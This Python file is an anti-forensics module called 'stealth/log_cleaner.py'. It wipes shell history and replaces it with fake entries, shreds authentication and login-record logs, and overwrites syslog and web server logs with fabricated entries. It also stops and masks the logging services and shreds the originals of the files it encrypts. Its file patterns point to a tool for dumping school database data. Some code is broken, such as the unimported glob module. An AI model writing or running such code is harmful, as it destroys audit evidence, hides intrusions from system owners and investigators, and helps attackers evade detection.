#!/usr/bin/env python3
# stealth/log_cleaner.py - Log Cleaning and Anti-Forensics Module
import os
import sys
import shutil
import random
import string
import hashlib
import subprocess
from datetime import datetime, timedelta
import logging

class LogCleaner:
    def __init__(self, log_level=logging.INFO):
        self.logger = self.setup_logger(log_level)
        self.temp_files = []
        
    def setup_logger(self, log_level):
        """Setup secure logger that doesn't leave traces"""
        logger = logging.getLogger('LogCleaner')
        logger.setLevel(log_level)
        
        # Remove all handlers
        logger.handlers.clear()
        
        # Add null handler (no output)
        logger.addHandler(logging.NullHandler())
        
        return logger
    
    def clear_bash_history(self, user=None):
        """Clear bash history for current or specified user"""
        try:
            if user is None:
                # Current user
                history_file = os.path.expanduser('~/.bash_history')
                zsh_history = os.path.expanduser('~/.zsh_history')
            else:
                # Specified user (requires sudo)
                history_file = f"/home/{user}/.bash_history"
                zsh_history = f"/home/{user}/.zsh_history"
            
            files_cleared = []
            
            # Clear bash history
            if os.path.exists(history_file):
                # Method 1: Empty the file
                with open(history_file, 'w') as f:
                    f.write('')
                
                # Method 2: Write fake history
                fake_history = self.generate_fake_history()
                with open(history_file, 'w') as f:
                    f.write(fake_history)
                
                # Method 3: Change permissions
                os.chmod(history_file, 0o600)
                
                files_cleared.append(history_file)
                self.logger.info(f"Cleared bash history: {history_file}")
            
            # Clear zsh history
            if os.path.exists(zsh_history):
                os.remove(zsh_history)
                files_cleared.append(zsh_history)
                self.logger.info(f"Removed zsh history: {zsh_history}")
            
            # Clear current session history
            if 'HISTFILE' in os.environ:
                histfile = os.environ['HISTFILE']
                if os.path.exists(histfile):
                    with open(histfile, 'w') as f:
                        f.write('')
                    files_cleared.append(histfile)
            
            # Clear memory history
            if 'HISTSIZE' in os.environ:
                os.environ['HISTSIZE'] = '0'
            
            # Execute history clear command
            subprocess.run(['history', '-c'], shell=True, capture_output=True)
            
            return {
                'success': True,
                'files_cleared': files_cleared,
                'message': f'Cleared {len(files_cleared)} history files'
            }
            
        except Exception as e:
            self.logger.error(f"Error clearing bash history: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def generate_fake_history(self):
        """Generate fake command history to replace real one"""
        fake_commands = [
            'ls -la',
            'cd ~',
            'pwd',
            'echo "Hello World"',
            'cat /etc/passwd',
            'whoami',
            'date',
            'python --version',
            'pip list',
            'git status',
            'sudo apt update',
            'sudo apt upgrade -y',
            'nano test.txt',
            'rm test.txt',
            'mkdir test_folder',
            'rmdir test_folder',
            'ssh user@localhost',
            'ping google.com',
            'curl https://example.com',
            'wget https://example.com/file.txt'
        ]
        
        # Add timestamps
        fake_history = []
        base_time = datetime.now() - timedelta(days=30)
        
        for i, cmd in enumerate(fake_commands):
            cmd_time = base_time + timedelta(hours=i*2)
            timestamp = cmd_time.strftime('%Y-%m-%d %H:%M:%S')
            fake_history.append(f"#{timestamp}\n{cmd}")
        
        return '\n'.join(fake_history)
    
    def clean_system_logs(self, log_types=None):
        """Clean various system logs"""
        if log_types is None:
            log_types = ['auth', 'syslog', 'kernel', 'apache', 'nginx']
        
        results = []
        
        for log_type in log_types:
            try:
                if log_type == 'auth':
                    result = self.clean_auth_logs()
                elif log_type == 'syslog':
                    result = self.clean_syslog()
                elif log_type == 'kernel':
                    result = self.clean_kernel_logs()
                elif log_type == 'apache':
                    result = self.clean_apache_logs()
                elif log_type == 'nginx':
                    result = self.clean_nginx_logs()
                else:
                    result = {'success': False, 'error': f'Unknown log type: {log_type}'}
                
                results.append({
                    'log_type': log_type,
                    **result
                })
                
            except Exception as e:
                results.append({
                    'log_type': log_type,
                    'success': False,
                    'error': str(e)
                })
        
        return results
    
    def clean_auth_logs(self):
        """Clean authentication logs"""
        auth_logs = [
            '/var/log/auth.log',
            '/var/log/secure',
            '/var/log/faillog',
            '/var/log/lastlog',
            '/var/log/wtmp',
            '/var/log/btmp',
            '/var/log/utmp'
        ]
        
        cleared = []
        
        for log_file in auth_logs:
            if os.path.exists(log_file):
                try:
                    # Method 1: Shred the file
                    self.shred_file(log_file)
                    
                    # Method 2: Create empty file with same permissions
                    if os.path.exists(log_file):
                        stat_info = os.stat(log_file)
                        with open(log_file, 'wb') as f:
                            f.write(b'')
                        os.chmod(log_file, stat_info.st_mode)
                        os.chown(log_file, stat_info.st_uid, stat_info.st_gid)
                    
                    cleared.append(log_file)
                    self.logger.info(f"Cleared auth log: {log_file}")
                    
                except PermissionError:
                    # Try to clear contents without deleting
                    try:
                        with open(log_file, 'w') as f:
                            f.write('')
                        cleared.append(f"{log_file} (contents only)")
                    except:
                        pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared,
            'message': f'Cleared {len(cleared)} auth logs'
        }
    
    def clean_syslog(self):
        """Clean system logs"""
        sys_logs = [
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/daemon.log',
            '/var/log/debug',
            '/var/log/kern.log'
        ]
        
        cleared = []
        
        for log_file in sys_logs:
            if os.path.exists(log_file):
                try:
                    # Rotate and clear
                    self.rotate_log_file(log_file)
                    cleared.append(log_file)
                    self.logger.info(f"Cleared syslog: {log_file}")
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def clean_kernel_logs(self):
        """Clean kernel logs"""
        kernel_logs = [
            '/var/log/kern.log',
            '/var/log/dmesg',
            '/var/log/boot.log'
        ]
        
        cleared = []
        
        for log_file in kernel_logs:
            if os.path.exists(log_file):
                try:
                    self.overwrite_file(log_file)
                    cleared.append(log_file)
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def clean_apache_logs(self):
        """Clean Apache web server logs"""
        apache_logs = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/apache2/other_vhosts_access.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log'
        ]
        
        cleared = []
        
        for log_file in apache_logs:
            if os.path.exists(log_file):
                try:
                    self.overwrite_with_fake_entries(log_file, 'apache')
                    cleared.append(log_file)
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def clean_nginx_logs(self):
        """Clean Nginx web server logs"""
        nginx_logs = [
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log'
        ]
        
        cleared = []
        
        for log_file in nginx_logs:
            if os.path.exists(log_file):
                try:
                    self.overwrite_with_fake_entries(log_file, 'nginx')
                    cleared.append(log_file)
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def shred_file(self, filepath, passes=3):
        """Securely delete a file with multiple overwrites"""
        try:
            file_size = os.path.getsize(filepath)
            
            # Multiple overwrite passes
            for pass_num in range(passes):
                with open(filepath, 'wb') as f:
                    # Write random data
                    if pass_num == 0:
                        # All zeros
                        f.write(b'\x00' * file_size)
                    elif pass_num == 1:
                        # All ones
                        f.write(b'\xFF' * file_size)
                    else:
                        # Random data
                        f.write(os.urandom(file_size))
            
            # Delete the file
            os.remove(filepath)
            
            # Overwrite filename in directory (if possible)
            self.overwrite_filename(filepath)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error shredding file {filepath}: {e}")
            return False
    
    def overwrite_filename(self, filepath):
        """Attempt to overwrite filename in directory"""
        try:
            # Rename multiple times with random names
            dirname = os.path.dirname(filepath)
            basename = os.path.basename(filepath)
            
            for _ in range(3):
                random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
                temp_path = os.path.join(dirname, random_name)
                if os.path.exists(filepath):
                    os.rename(filepath, temp_path)
                    filepath = temp_path
            
            # Finally delete
            if os.path.exists(filepath):
                os.remove(filepath)
                
        except:
            pass
    
    def rotate_log_file(self, filepath, keep_backups=0):
        """Rotate log file (like logrotate)"""
        try:
            if not os.path.exists(filepath):
                return False
            
            # Create backup copies
            for i in range(keep_backups, 0, -1):
                old_file = f"{filepath}.{i}"
                older_file = f"{filepath}.{i+1}"
                
                if os.path.exists(old_file):
                    if os.path.exists(older_file):
                        os.remove(older_file)
                    os.rename(old_file, older_file)
            
            # Rotate current log
            if os.path.exists(filepath):
                backup_file = f"{filepath}.1"
                if os.path.exists(backup_file):
                    os.remove(backup_file)
                os.rename(filepath, backup_file)
            
            # Create new empty log file with same permissions
            if os.path.exists(backup_file):
                stat_info = os.stat(backup_file)
                with open(filepath, 'w') as f:
                    f.write('')
                os.chmod(filepath, stat_info.st_mode)
                os.chown(filepath, stat_info.st_uid, stat_info.st_gid)
            
            # Securely delete old backups
            for i in range(keep_backups + 1, 1, -1):
                old_backup = f"{filepath}.{i}"
                if os.path.exists(old_backup):
                    self.shred_file(old_backup)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error rotating log {filepath}: {e}")
            return False
    
    def overwrite_file(self, filepath):
        """Overwrite file with random data"""
        try:
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath)
                with open(filepath, 'wb') as f:
                    f.write(os.urandom(file_size))
                return True
        except:
            return False
        return False
    
    def overwrite_with_fake_entries(self, log_file, log_type):
        """Overwrite log file with fake entries"""
        try:
            if not os.path.exists(log_file):
                return False
            
            # Generate fake log entries
            fake_entries = self.generate_fake_log_entries(log_type, 100)
            
            # Backup original permissions
            stat_info = os.stat(log_file)
            
            # Write fake entries
            with open(log_file, 'w') as f:
                f.write('\n'.join(fake_entries))
            
            # Restore permissions
            os.chmod(log_file, stat_info.st_mode)
            os.chown(log_file, stat_info.st_uid, stat_info.st_gid)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error overwriting {log_file}: {e}")
            return False
    
    def generate_fake_log_entries(self, log_type, count=50):
        """Generate fake log entries"""
        entries = []
        base_time = datetime.now() - timedelta(days=7)
        
        if log_type == 'apache':
            for i in range(count):
                log_time = base_time + timedelta(minutes=i*10)
                timestamp = log_time.strftime('[%d/%b/%Y:%H:%M:%S %z]')
                
                ips = ['192.168.1.' + str(random.randint(1, 254)) for _ in range(3)]
                methods = ['GET', 'POST', 'HEAD']
                paths = ['/', '/index.html', '/about.html', '/contact.html', '/login.php']
                status_codes = ['200', '404', '301', '500']
                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Googlebot/2.1 (+http://www.google.com/bot.html)'
                ]
                
                entry = f'{random.choice(ips)} - - {timestamp} "{random.choice(methods)} {random.choice(paths)} HTTP/1.1" {random.choice(status_codes)} 1234 "-" "{random.choice(user_agents)}"'
                entries.append(entry)
        
        elif log_type == 'nginx':
            for i in range(count):
                log_time = base_time + timedelta(minutes=i*10)
                timestamp = log_time.strftime('%d/%b/%Y:%H:%M:%S %z')
                
                ips = ['10.0.0.' + str(random.randint(1, 254)) for _ in range(3)]
                methods = ['GET', 'POST']
                paths = ['/', '/api/v1/data', '/static/css/style.css', '/images/logo.png']
                status_codes = ['200', '304', '404']
                
                entry = f'{random.choice(ips)} - - [{timestamp}] "{random.choice(methods)} {random.choice(paths)} HTTP/1.1" {random.choice(status_codes)} 5678 "-" "Mozilla/5.0"'
                entries.append(entry)
        
        else:
            # Generic system log
            for i in range(count):
                log_time = base_time + timedelta(minutes=i*30)
                timestamp = log_time.strftime('%b %d %H:%M:%S')
                
                hosts = ['server01', 'server02', 'localhost']
                processes = ['sshd', 'cron', 'systemd', 'kernel', 'sudo']
                messages = [
                    'Accepted password for user from',
                    'session opened for user',
                    'system shutdown',
                    'kernel: USB device connected',
                    'CRON: job completed'
                ]
                
                entry = f'{timestamp} {random.choice(hosts)} {random.choice(processes)}[{random.randint(1000, 9999)}]: {random.choice(messages)}'
                entries.append(entry)
        
        return entries
    
    def encrypt_sensitive_files(self, filepaths, password=None):
        """Encrypt sensitive output files"""
        if not password:
            password = self.generate_strong_password()
        
        encrypted_files = []
        
        for filepath in filepaths:
            if os.path.exists(filepath):
                try:
                    encrypted_path = self.encrypt_file(filepath, password)
                    if encrypted_path:
                        encrypted_files.append({
                            'original': filepath,
                            'encrypted': encrypted_path,
                            'status': 'success'
                        })
                        
                        # Securely delete original
                        self.shred_file(filepath)
                    else:
                        encrypted_files.append({
                            'original': filepath,
                            'status': 'failed'
                        })
                        
                except Exception as e:
                    encrypted_files.append({
                        'original': filepath,
                        'status': 'error',
                        'error': str(e)
                    })
        
        return {
            'encrypted_count': len([f for f in encrypted_files if f['status'] == 'success']),
            'password': password,  # IMPORTANT: User must save this!
            'files': encrypted_files
        }
    
    def encrypt_file(self, filepath, password):
        """Encrypt a file using AES"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            from Crypto.Random import get_random_bytes
            import base64
            
            # Generate key from password
            key = hashlib.sha256(password.encode()).digest()
            
            # Read file content
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            # Generate IV
            iv = get_random_bytes(16)
            
            # Create cipher
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
            # Encrypt
            padded_data = pad(plaintext, AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            
            # Combine IV + ciphertext
            encrypted_data = iv + ciphertext
            
            # Save to new file
            encrypted_path = filepath + '.enc'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            return encrypted_path
            
        except ImportError:
            # Fallback to simple XOR encryption if Crypto not available
            return self.xor_encrypt_file(filepath, password)
        except Exception as e:
            self.logger.error(f"Error encrypting file: {e}")
            return None
    
    def xor_encrypt_file(self, filepath, password):
        """Simple XOR encryption (less secure but no dependencies)"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Convert password to bytes
            key = password.encode()
            key_length = len(key)
            
            # XOR encryption
            encrypted = bytearray()
            for i, byte in enumerate(data):
                encrypted.append(byte ^ key[i % key_length])
            
            # Save encrypted file
            encrypted_path = filepath + '.xor'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            return encrypted_path
            
        except Exception as e:
            self.logger.error(f"XOR encryption failed: {e}")
            return None
    
    def generate_strong_password(self, length=32):
        """Generate strong password"""
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    def clean_temporary_files(self):
        """Clean temporary files created by the tool"""
        cleaned = []
        
        # Common temp directories
        temp_dirs = [
            '/tmp',
            '/var/tmp',
            os.path.expanduser('~/tmp'),
            os.path.expanduser('~/.cache')
        ]
        
        # Files with patterns from our tool
        patterns = [
            'edudb_*',
            'school_scan_*',
            'dump_*',
            'extract_*',
            'report_*',
            '*.json.tmp',
            '*.csv.tmp'
        ]
        
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for pattern in patterns:
                    try:
                        for filepath in glob.glob(os.path.join(temp_dir, pattern)):
                            try:
                                if os.path.isfile(filepath):
                                    self.shred_file(filepath)
                                    cleaned.append(filepath)
                                elif os.path.isdir(filepath):
                                    shutil.rmtree(filepath, ignore_errors=True)
                                    cleaned.append(filepath + '/')
                            except:
                                pass
                    except:
                        pass
        
        # Clean our own temp files
        for temp_file in self.temp_files:
            if os.path.exists(temp_file):
                try:
                    self.shred_file(temp_file)
                    cleaned.append(temp_file)
                except:
                    pass
        
        self.temp_files.clear()
        
        return {
            'cleaned_count': len(cleaned),
            'cleaned_files': cleaned[:10]  # Limit output
        }
    
    def disable_logging(self):
        """Disable system logging temporarily"""
        try:
            # Stop logging services
            services = ['rsyslog', 'syslog', 'systemd-journald']
            
            for service in services:
                try:
                    subprocess.run(['systemctl', 'stop', service], 
                                 capture_output=True, timeout=5)
                    subprocess.run(['systemctl', 'mask', service],
                                 capture_output=True, timeout=5)
                except:
                    pass
            
            # Disable kernel logging
            with open('/proc/sys/kernel/printk', 'w') as f:
                f.write('0 0 0 0\n')
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error disabling logging: {e}")
            return False
    
    def enable_logging(self):
        """Re-enable system logging"""
        try:
            # Re-enable logging services
            services = ['rsyslog', 'syslog', 'systemd-journald']
            
            for service in services:
                try:
                    subprocess.run(['systemctl', 'unmask', service],
                                 capture_output=True, timeout=5)
                    subprocess.run(['systemctl', 'start', service],
                                 capture_output=True, timeout=5)
                except:
                    pass
            
            # Re-enable kernel logging
            with open('/proc/sys/kernel/printk', 'w') as f:
                f.write('4 4 1 7\n')
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error enabling logging: {e}")
            return False
    
    def secure_delete_directory(self, directory_path, passes=3):
        """Securely delete entire directory"""
        try:
            if not os.path.exists(directory_path):
                return {'success': False, 'error': 'Directory does not exist'}
            
            # First, shred all files
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    filepath = os.path.join(root, file)
                    self.shred_file(filepath, passes)
            
            # Then delete directory structure
            shutil.rmtree(directory_path, ignore_errors=True)
            
            # Overwrite directory name
            self.overwrite_filename(directory_path)
            
            return {
                'success': True,
                'message': f'Securely deleted directory: {directory_path}'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

# Example usage
if __name__ == "__main__":
    print("[+] Testing Log Cleaner Module")
    
    cleaner = LogCleaner()
    
    # 1. Clear bash history
    print("\n[1] Clearing bash history...")
    history_result = cleaner.clear_bash_history()
    print(f"   Result: {history_result.get('message', 'Failed')}")
    
    # 2. Clean system logs
    print("\n[2] Cleaning system logs...")
    log_results = cleaner.clean_system_logs(['auth', 'syslog'])
    for result in log_results:
        print(f"   {result['log_type']}: {len(result.get('files_cleared', []))} files")
    
    # 3. Encrypt test file
    print("\n[3] Testing file encryption...")
    test_file = 'test_sensitive_data.txt'
    with open(test_file, 'w') as f:
        f.write('This is sensitive school data that needs encryption')
    
    encrypt_result = cleaner.encrypt_sensitive_files([test_file])
    print(f"   Encrypted: {encrypt_result['encrypted_count']} file(s)")
    print(f"   Password: {encrypt_result['password'][:20]}...")
    
    # 4. Clean temporary files
    print("\n[4] Cleaning temporary files...")
    temp_result = cleaner.clean_temporary_files()
    print(f"   Cleaned {temp_result['cleaned_count']} temporary files")
    
    print("\n[✓] Log cleaning tests completed")
